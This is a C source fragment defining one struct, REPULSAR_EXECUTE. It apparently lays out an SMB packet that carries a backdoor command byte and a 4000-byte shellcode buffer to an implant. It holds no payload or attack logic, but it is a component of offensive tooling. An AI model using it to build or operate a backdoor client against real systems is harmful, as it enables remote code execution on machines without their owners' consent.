typedef struct _REPULSAR_EXECUTE {
	UINT16 NetBios;
	UINT16 NetBiosLength;
	UINT8 SmbHeader[4];
	UINT8 BackdoorCommand;
	UINT16 ShellcodeLength;
	UCHAR shellcode[4000];
}REPULSAR_EXECUTE, *PREPULSAR_EXECUTE;